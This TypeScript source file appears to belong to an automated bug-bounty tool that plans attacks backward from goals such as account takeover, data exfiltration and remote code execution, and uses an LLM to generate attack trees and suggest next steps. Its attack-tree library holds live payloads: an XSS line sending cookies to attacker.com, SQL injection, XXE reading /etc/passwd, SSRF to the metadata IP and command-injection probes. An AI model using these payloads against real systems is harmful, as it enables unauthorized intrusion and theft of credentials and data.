/**
 * Backward Hunt Engine
 * Goal-first hunting methodology working backward from desired outcomes
 * using pre-built attack trees.
 * External Plan Memory: attack plans stored outside context window,
 * retrieved at budget checkpoints, with auto-adaptation.
 */
import { v4 as uuidv4 } from "uuid";
import { db } from "../db";
import { attackPlans } from "../db/schema";
import { eq } from "drizzle-orm";
import { ATTACK_TREES, ExploitChainDef } from "./ExploitChain";
import { ModelRouter } from "./ModelRouter";
import logger from "../utils/logger";

export interface AttackTreeNode {
  id: string;
  goal: string;
  preconditions: string[];
  approaches: AttackApproach[];
  parent?: string;
  children?: AttackTreeNode[];
}

export interface AttackApproach {
  id: string;
  description: string;
  vulnClass: string;
  estimatedSuccessRate: number;
  tools: string[];
  payloads: string[];
}

export interface BackwardPlan {
  planId: string;
  objective: string;
  rootNode: AttackTreeNode;
  currentNode: string;
  budgetCheckpoint: number;
  requestsMade: number;
  adaptations: string[];
  status: "active" | "paused" | "complete" | "failed";
}

// Pre-built attack trees for common objectives
const ATTACK_TREE_LIBRARY: Record<string, AttackTreeNode> = {
  full_account_compromise: {
    id: "root",
    goal: "Achieve full account compromise",
    preconditions: [],
    approaches: [],
    children: [
      {
        id: "cred_theft",
        goal: "Steal credentials",
        preconditions: [],
        approaches: [
          { id: "xss_cookie", description: "XSS to steal session cookie", vulnClass: "xss", estimatedSuccessRate: 0.3, tools: ["nuclei", "manual"], payloads: ["<script>document.location='https://attacker.com/'+document.cookie</script>"] },
          { id: "phishing", description: "Open redirect for phishing", vulnClass: "open_redirect", estimatedSuccessRate: 0.4, tools: ["manual"], payloads: ["https://attacker.com/fake-login"] },
        ],
      },
      {
        id: "session_hijack",
        goal: "Hijack active session",
        preconditions: [],
        approaches: [
          { id: "session_fixation", description: "Session fixation attack", vulnClass: "auth_bypass", estimatedSuccessRate: 0.2, tools: ["manual"], payloads: [] },
          { id: "csrf_chain", description: "CSRF to change email/password", vulnClass: "csrf", estimatedSuccessRate: 0.35, tools: ["manual"], payloads: [] },
        ],
      },
      {
        id: "auth_bypass",
        goal: "Bypass authentication directly",
        preconditions: [],
        approaches: [
          { id: "sqli_bypass", description: "SQL injection in login", vulnClass: "sqli", estimatedSuccessRate: 0.25, tools: ["sqlmap"], payloads: ["' OR '1'='1", "admin'--"] },
          { id: "pwd_reset", description: "Password reset bypass", vulnClass: "auth_bypass", estimatedSuccessRate: 0.2, tools: ["manual"], payloads: [] },
        ],
      },
    ],
  },
  data_exfiltration: {
    id: "root",
    goal: "Exfiltrate sensitive data",
    preconditions: [],
    approaches: [],
    children: [
      {
        id: "direct_access",
        goal: "Access data directly via API/DB",
        preconditions: [],
        approaches: [
          { id: "idor_data", description: "IDOR to access other users data", vulnClass: "idor", estimatedSuccessRate: 0.4, tools: ["manual", "burp"], payloads: [] },
          { id: "sqli_dump", description: "SQL injection for data dump", vulnClass: "sqli", estimatedSuccessRate: 0.25, tools: ["sqlmap"], payloads: ["' UNION SELECT * FROM users--"] },
        ],
      },
      {
        id: "internal_access",
        goal: "Access internal systems via SSRF",
        preconditions: [],
        approaches: [
          { id: "ssrf_s3", description: "SSRF to access AWS S3/metadata", vulnClass: "ssrf", estimatedSuccessRate: 0.3, tools: ["nuclei", "manual"], payloads: ["http://169.254.169.254/"] },
          { id: "xxe_read", description: "XXE to read internal files", vulnClass: "xxe", estimatedSuccessRate: 0.2, tools: ["nuclei"], payloads: ['<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'] },
        ],
      },
    ],
  },
  rce: {
    id: "root",
    goal: "Achieve Remote Code Execution",
    preconditions: [],
    approaches: [],
    children: [
      {
        id: "direct_rce",
        goal: "Direct command injection",
        preconditions: [],
        approaches: [
          { id: "cmdi", description: "Command injection in parameters", vulnClass: "rce", estimatedSuccessRate: 0.15, tools: ["nuclei", "manual"], payloads: ["; id", "| id", "`id`", "$(id)"] },
          { id: "ssti", description: "Server-side template injection", vulnClass: "rce", estimatedSuccessRate: 0.2, tools: ["nuclei"], payloads: ["{{7*7}}", "${7*7}", "<%=7*7%>"] },
        ],
      },
      {
        id: "chained_rce",
        goal: "Chain vulnerabilities to RCE",
        preconditions: [],
        approaches: [
          { id: "lfi_to_rce", description: "LFI to RCE via log poisoning", vulnClass: "lfi", estimatedSuccessRate: 0.1, tools: ["nuclei", "manual"], payloads: ["../../../var/log/apache2/access.log"] },
          { id: "ssrf_to_rce", description: "SSRF to internal service RCE", vulnClass: "ssrf", estimatedSuccessRate: 0.15, tools: ["manual"], payloads: [] },
        ],
      },
    ],
  },
};

export class BackwardHuntEngine {
  private modelRouter = ModelRouter.getInstance();

  async createPlan(params: {
    campaignId: number;
    objective: string;
    targetUrl: string;
    /** Bypasses objective matching entirely — a user-ordered vuln-class priority
     *  list becomes a synthetic single-node tree with one approach per class,
     *  success rates assigned in descending order so getNextActions()'s existing
     *  sort-by-success-rate preserves the exact order the user chose. */
    customVulnPriority?: string[];
  }): Promise<BackwardPlan> {
    const planId = uuidv4();
    let rootNode: AttackTreeNode;
    let treeKey: string | null = null;

    if (params.customVulnPriority && params.customVulnPriority.length > 0) {
      rootNode = this.buildCustomPriorityTree(params.customVulnPriority);
      treeKey = "custom_priority";
    } else {
      // Match objective to a pre-built tree; if nothing matches confidently,
      // generate a bespoke tree via AI instead of silently defaulting to an
      // unrelated canned tree.
      treeKey = this.matchObjective(params.objective);
      rootNode = treeKey
        ? ATTACK_TREE_LIBRARY[treeKey]
        : await this.generateAttackTree(params.objective, params.targetUrl);
    }

    // Inject target URL into all nodes
    rootNode = this.injectTarget(rootNode, params.targetUrl);

    const objective = params.customVulnPriority?.length
      ? `Custom priority order: ${params.customVulnPriority.join(" > ")}`
      : params.objective;

    const plan: BackwardPlan = {
      planId,
      objective,
      rootNode,
      currentNode: rootNode.id,
      budgetCheckpoint: 500,
      requestsMade: 0,
      adaptations: [],
      status: "active",
    };

    // Persist plan
    await db.insert(attackPlans).values({
      campaignId: params.campaignId,
      planUuid: planId,
      goal: objective,
      attackTree: rootNode as unknown as Record<string, unknown>,
      currentNode: rootNode.id,
      status: "active",
    });

    logger.info("BackwardHunt: Plan created", { planId, objective, treeKey });
    return plan;
  }

  private buildCustomPriorityTree(vulnClasses: string[]): AttackTreeNode {
    const approaches: AttackApproach[] = vulnClasses.map((vulnClass, i) => ({
      id: `custom_${vulnClass}_${i}`,
      description: `User-prioritized (rank ${i + 1}): ${vulnClass}`,
      vulnClass,
      estimatedSuccessRate: Math.max(0.05, 1 - i * 0.1),
      tools: [],
      payloads: [],
    }));
    return {
      id: "root",
      goal: `Custom priority order: ${vulnClasses.join(" > ")}`,
      preconditions: [],
      approaches,
    };
  }

  async retrievePlan(planId: string): Promise<BackwardPlan | null> {
    const [plan] = await db.select().from(attackPlans)
      .where(eq(attackPlans.planUuid, planId)).limit(1);

    if (!plan) return null;

    return {
      planId,
      objective: plan.goal,
      rootNode: plan.attackTree as unknown as AttackTreeNode,
      currentNode: plan.currentNode || "root",
      budgetCheckpoint: plan.checkpointBudget || 500,
      requestsMade: 0,
      adaptations: (plan.adaptations as string[]) || [],
      status: plan.status as BackwardPlan["status"],
    };
  }

  async adaptPlan(planId: string, failedApproaches: string[], successfulApproaches: string[]): Promise<BackwardPlan | null> {
    const plan = await this.retrievePlan(planId);
    if (!plan) return null;

    const adaptationNote = `Adapted at checkpoint: failed [${failedApproaches.join(", ")}], succeeded [${successfulApproaches.join(", ")}]`;
    plan.adaptations.push(adaptationNote);

    // Use AI to suggest next approach
    const nextApproach = await this.suggestNextApproach(plan, failedApproaches);
    plan.adaptations.push(`AI Recommendation: ${nextApproach}`);

    // Update DB
    await db.update(attackPlans).set({
      adaptations: plan.adaptations,
      updatedAt: new Date(),
    }).where(eq(attackPlans.planUuid, planId));

    logger.info("BackwardHunt: Plan adapted", { planId, adaptations: plan.adaptations.length });
    return plan;
  }

  async getNextActions(plan: BackwardPlan): Promise<AttackApproach[]> {
    // Work backward from current node – find highest success rate approaches
    const currentNode = this.findNode(plan.rootNode, plan.currentNode) || plan.rootNode;
    const allApproaches: AttackApproach[] = [];

    const collectApproaches = (node: AttackTreeNode) => {
      allApproaches.push(...node.approaches);
      if (node.children) node.children.forEach(collectApproaches);
    };
    collectApproaches(currentNode);

    return allApproaches.sort((a, b) => b.estimatedSuccessRate - a.estimatedSuccessRate);
  }

  // Word-boundary regex (not raw includes()) so "execution" matches "execut\w*"
  // without a substring accident, and broader synonym coverage per tree. Checked
  // in this priority order — RCE and account-takeover are more specific signals
  // than the data-exfiltration catch-all, so they're tried first to avoid a goal
  // like "steal data via RCE" landing on the wrong tree.
  private static readonly TREE_KEYWORDS: Array<[string, RegExp]> = [
    ["rce", /\b(rce|remote\s*code|execut\w*|shell|command\s*inject\w*|cmdi)\b/i],
    ["full_account_compromise", /\b(account|takeover|login|credential\w*|session\s*hijack\w*|impersonat\w*)\b/i],
    ["data_exfiltration", /\b(data|exfil\w*|pii|leak\w*|dump\w*|database|sensitive)\b/i],
  ];

  // Returns null (no confident match) instead of silently defaulting to an
  // unrelated tree — the caller falls back to AI-generated bespoke tree
  // generation in that case, rather than forcing every unmatched objective
  // into "data_exfiltration".
  private matchObjective(objective: string): string | null {
    for (const [tree, pattern] of BackwardHuntEngine.TREE_KEYWORDS) {
      if (pattern.test(objective)) return tree;
    }
    return null;
  }

  private async generateAttackTree(objective: string, targetUrl: string): Promise<AttackTreeNode> {
    const prompt = `You are a bug bounty hunter. Create an attack tree for the following objective:
Objective: ${objective}
Target: ${targetUrl}

Generate a hierarchical attack tree with:
- Root node: the final objective
- Child nodes: sub-goals required to achieve the objective
- Each node has approaches (vulnerability classes to test)

Return JSON matching AttackTreeNode structure with: id, goal, preconditions, approaches (each with id, description, vulnClass, estimatedSuccessRate, tools, payloads), children.

Keep it to 2-3 levels deep with 2-4 approaches per node. Return ONLY the JSON object.`;

    try {
      // oneShot — attack-tree generation is a single structured JSON extraction,
      // no conversation thread needed. Previously used reason() without sessionId,
      // colliding with PostExploitAgent on the shared "default" Sonnet thread.
      const { ClaudeClient } = await import("../lib/claude-client");
      const response = await ClaudeClient.oneShot(
        "You are an expert bug bounty hunter. Return only valid JSON, no markdown.",
        prompt,
      );
      const parsed = JSON.parse(response.match(/\{[\s\S]+\}/)?.[0] || "{}");
      return parsed;
    } catch {
      return ATTACK_TREE_LIBRARY.data_exfiltration; // fallback
    }
  }

  private injectTarget(node: AttackTreeNode, targetUrl: string): AttackTreeNode {
    // Recursively inject target URL into approaches
    const result = { ...node };
    if (result.children) {
      result.children = result.children.map(c => this.injectTarget(c, targetUrl));
    }
    return result;
  }

  private findNode(root: AttackTreeNode, id: string): AttackTreeNode | null {
    if (root.id === id) return root;
    if (root.children) {
      for (const child of root.children) {
        const found = this.findNode(child, id);
        if (found) return found;
      }
    }
    return null;
  }

  private async suggestNextApproach(plan: BackwardPlan, failed: string[]): Promise<string> {
    const prompt = `Bug bounty hunting plan adaptation needed.
Objective: ${plan.objective}
Failed approaches: ${JSON.stringify(failed)}
Previous adaptations: ${JSON.stringify(plan.adaptations)}

Suggest the most promising next approach to try. Be specific and actionable. Respond in 1-2 sentences.`;

    try {
      return await this.modelRouter.generate(prompt, "reason");
    } catch {
      return "Try enumeration and information gathering before attempting exploitation";
    }
  }
}

export default BackwardHuntEngine;
